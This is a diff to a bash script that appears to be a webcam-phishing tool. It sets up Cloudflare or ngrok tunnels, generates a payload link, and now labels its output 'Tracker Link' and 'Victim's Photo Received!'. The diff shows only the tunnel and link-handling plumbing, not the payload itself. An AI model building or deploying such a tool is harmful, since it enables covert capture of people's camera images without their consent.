@@ -90,7 +90,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Victim's Photo Received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -148,7 +148,7 @@ if [[ -z "$send_link" ]]; then
 fi
 # Display the link
 if [[ -n "$send_link" ]]; then
-    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
+    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
 else
     printf '\n\e[1;31m[!] Could not extract link from sendlink file\e[0m\n'
     printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
@@ -249,7 +249,7 @@ done
 send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)
 
 if [[ -n "$send_link" ]]; then
-    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
+    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
     # Generate payload with the extracted link
     generate_payload "$send_link"
 else
@@ -383,14 +383,14 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "\e[1;31m[!] Tracker link is not generating, check following possible reason  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_ngrok
 checkfound
